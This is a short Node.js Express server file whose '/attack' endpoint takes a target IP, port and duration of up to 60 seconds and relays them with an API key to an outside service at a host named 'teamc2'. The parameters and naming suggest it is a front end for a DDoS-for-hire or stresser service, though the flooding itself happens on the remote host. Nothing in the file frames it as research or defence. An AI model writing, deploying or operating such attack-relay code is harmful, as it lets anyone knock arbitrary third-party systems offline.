// file: server.js

require("dotenv").config();

const express = require("express");
const axios = require("axios");
const cors = require("cors");

const app = express();

app.use(cors());
app.use(express.json());

const API_KEY = process.env.API_KEY;
const PORT = process.env.PORT;

// safety checks
if (!PORT) {
  console.error("FATAL: PORT not provided");
  process.exit(1);
}

if (!API_KEY) {
  console.error("FATAL: API_KEY missing");
  process.exit(1);
}

// health
app.get("/", (req, res) => {
  res.send("API Running ✅");
});

// 🔥 FINAL ROUTE
app.get("/attack", async (req, res) => {
  try {
    const { ip, port, time } = req.query;

    // basic validation
    if (!ip || !port || !time) {
      return res.status(400).json({ error: "Missing params" });
    }

    // limits
    if (time > 60) {
      return res.status(400).json({ error: "Max time 60s" });
    }

    // external API call
    const url = `https://app.teamc2.xyz/api/attack`;

    const response = await axios.get(url, {
      params: {
        api_key: API_KEY,
        target: ip,
        port: port,
        time: time,
        concurrent: 1,
      },
      timeout: 10000,
    });

    res.json(response.data);

  } catch (err) {
    console.error("ERROR:", err.message);
    res.status(500).json({ error: "Failed" });
  }
});

// 404
app.use((req, res) => {
  res.status(404).json({ error: "Route not found" });
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running on port ${PORT}`);
});